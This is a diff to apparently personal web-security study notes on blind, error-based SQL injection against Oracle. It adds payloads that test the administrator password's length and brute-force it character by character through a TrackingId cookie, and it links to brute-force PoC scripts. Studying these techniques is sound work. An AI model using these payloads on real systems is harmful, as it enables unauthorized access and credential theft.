@@ -26,7 +26,9 @@ So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`  
 Now we start to infer the existence of information (users, passwords, tables, etc)  
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
-`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
+`'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'` 
+Length of password  
+`'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'. Then send: TrackingId='||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
 #### Example PoCs: [BlindSQLI Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/bruteforce_blindsqli.py) [BlindNOsqli Brute](https://github.com/kymb0/General_code_repo/blob/master/Code_templates/brute_mongoDB_nosqli.py)
 
@@ -109,6 +111,7 @@ So, in the event that CASE comes out TRUE, we divide by 0 - causing an error.
 Now we start to infer the existence of information (users, passwords, tables, etc)  
 `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
 `'||(SELECT CASE WHEN length(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`  
-
+Now we bruteforce as before  
+`'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
 
 ### [Error Based SQLi](https://github.com/kymb0/web_study/blob/master/sqli/error_based_sqli.md)
